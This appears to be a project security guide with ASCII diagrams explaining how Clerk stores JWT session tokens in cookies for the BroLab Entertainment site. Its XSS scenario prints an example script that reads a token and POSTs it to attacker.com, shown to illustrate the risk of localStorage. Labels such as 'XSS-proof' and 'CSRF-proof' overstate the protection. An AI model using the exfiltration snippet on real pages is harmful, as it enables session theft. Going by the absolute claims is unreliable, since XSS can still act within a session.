# JWT Storage Architecture - Visual Guide

## How Clerk Secures Your Tokens

```
┌─────────────────────────────────────────────────────────────────┐
│                    USER BROWSER                                  │
│                                                                  │
│  ┌────────────────────────────────────────────────────────┐    │
│  │  JavaScript Context (Accessible to XSS)                 │    │
│  │                                                          │    │
│  │  localStorage:                                           │    │
│  │    ✅ audio-player-storage (volume, mute)               │    │
│  │    ✅ theme (dark/light mode)                           │    │
│  │    ❌ NO JWT TOKENS HERE                                │    │
│  │                                                          │    │
│  │  document.cookie (non-httpOnly):                        │    │
│  │    ⚠️  __session (1-minute JWT)                         │    │
│  │       └─ Short-lived, minimal XSS risk                  │    │
│  └────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌────────────────────────────────────────────────────────┐    │
│  │  HTTP-Only Cookie Storage (XSS-PROOF)                   │    │
│  │                                                          │    │
│  │  🔒 __client_uat (Long-lived JWT)                       │    │
│  │     Domain: .clerk.accounts.dev                         │    │
│  │     HttpOnly: YES                                        │    │
│  │     SameSite: Lax                                        │    │
│  │     Secure: YES (production)                             │    │
│  │     ❌ INACCESSIBLE TO JAVASCRIPT                        │    │
│  └────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

---

## Token Lifecycle Flow

```
┌──────────────┐
│  User Signs  │
│      In      │
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────────────────────────┐
│  Clerk Authentication Server                              │
│                                                           │
│  1. Validates credentials                                 │
│  2. Generates JWT tokens                                  │
│  3. Sets cookies with security flags                      │
└──────┬───────────────────────────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────────────────────────┐
│  Browser Receives Cookies                                 │
│                                                           │
│  Set-Cookie: __session=<jwt>; Max-Age=60; Path=/         │
│  Set-Cookie: __client_uat=<jwt>; HttpOnly; SameSite=Lax  │
└──────┬───────────────────────────────────────────────────┘
       │
       ▼
┌──────────────────────────────────────────────────────────┐
│  Subsequent Requests                                      │
│                                                           │
│  Browser automatically includes cookies:                  │
│    ✅ __session (client SDK reads this)                  │
│    ✅ __client_uat (server validates this)               │
│                                                           │
│  Clerk SDK handles token refresh automatically           │
└──────────────────────────────────────────────────────────┘
```

---

## XSS Attack Scenario (Mitigated)

### ❌ What Happens with localStorage (INSECURE)

```
┌─────────────────────────────────────────────────────────┐
│  Malicious Script Injected (XSS Attack)                  │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  const token = localStorage.getItem('jwt_token')         │
│  fetch('https://attacker.com/steal', {                   │
│    method: 'POST',                                        │
│    body: JSON.stringify({ token })                       │
│  })                                                       │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  ❌ TOKEN STOLEN                                         │
│  Attacker can impersonate user indefinitely              │
└─────────────────────────────────────────────────────────┘
```

### ✅ What Happens with httpOnly Cookies (SECURE)

```
┌─────────────────────────────────────────────────────────┐
│  Malicious Script Injected (XSS Attack)                  │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  const token = document.cookie                           │
│  // Returns: "__session=<jwt>"                           │
│  // __client_uat is INVISIBLE (httpOnly)                 │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  Attacker steals __session token                         │
│  ⚠️  Token expires in 1 MINUTE                           │
│  ✅ Long-lived token (__client_uat) is SAFE              │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  ✅ MINIMAL DAMAGE                                       │
│  - Attacker has 1-minute window                          │
│  - Long-lived token remains secure                       │
│  - User can revoke session from dashboard                │
└─────────────────────────────────────────────────────────┘
```

---

## Cookie Comparison Table

| Cookie | Domain | HttpOnly | Lifetime | Purpose | XSS Risk |
|--------|--------|----------|----------|---------|----------|
| `__session` | `brolabentertainment.com` | ❌ NO | 1 minute | Client SDK access | ⚠️ LOW (short-lived) |
| `__client_uat` | `.clerk.accounts.dev` | ✅ YES | Long-lived | Session management | ✅ NONE (httpOnly) |

---

## Security Layers

```
┌─────────────────────────────────────────────────────────┐
│  Layer 1: HttpOnly Cookies                               │
│  ✅ Long-lived tokens inaccessible to JavaScript         │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  Layer 2: Short-Lived Client Tokens                      │
│  ✅ 1-minute expiry minimizes XSS exposure               │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  Layer 3: SameSite Cookie Protection                     │
│  ✅ Prevents CSRF attacks                                │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  Layer 4: Automatic Token Rotation                       │
│  ✅ Compromised tokens expire quickly                    │
└──────┬──────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────┐
│  Layer 5: Secure Flag (Production)                       │
│  ✅ HTTPS-only transmission                              │
└─────────────────────────────────────────────────────────┘
```

---

## Developer Best Practices

### ✅ DO (What We're Doing)

```typescript
// Server-side: Let Clerk handle tokens
import { auth } from '@clerk/nextjs/server'

export default async function Page() {
  const { userId } = await auth()
  // Clerk reads httpOnly cookies automatically
}

// Client-side: Use Clerk hooks
import { useAuth } from '@clerk/nextjs'

export default function Component() {
  const { userId } = useAuth()
  // No manual token handling needed
}
```

### ❌ DON'T (Anti-patterns)

```typescript
// ❌ NEVER store tokens in localStorage
localStorage.setItem('jwt', token)

// ❌ NEVER store tokens in sessionStorage
sessionStorage.setItem('auth_token', token)

// ❌ NEVER store tokens in non-httpOnly cookies
document.cookie = `token=${jwt}; path=/`

// ❌ NEVER manually extract tokens from cookies
const token = document.cookie.split('__session=')[1]
```

---

## Testing Your Implementation

### Browser DevTools Verification

1. **Open DevTools** → Application → Cookies
2. **Check your domain** (e.g., `localhost:3000`)
   - Should see: `__session` (non-httpOnly, 1-minute expiry)
3. **Check Clerk domain** (e.g., `.clerk.accounts.dev`)
   - Should see: `__client_uat` (httpOnly ✅)

### Console Verification

```javascript
// In browser console
console.log(localStorage)
// Should NOT contain: jwt, token, auth, session

console.log(document.cookie)
// Should see: __session=<jwt>
// Should NOT see: __client_uat (it's httpOnly)
```

---

## Summary

**BroLab Entertainment's JWT Storage: ✅ SECURE**

- ✅ Long-lived tokens in httpOnly cookies (XSS-proof)
- ✅ Short-lived client tokens (1-minute expiry)
- ✅ No localStorage usage for auth
- ✅ SameSite protection (CSRF-proof)
- ✅ Automatic token rotation
- ✅ No manual token handling

**Result:** Industry-standard security with defense-in-depth.
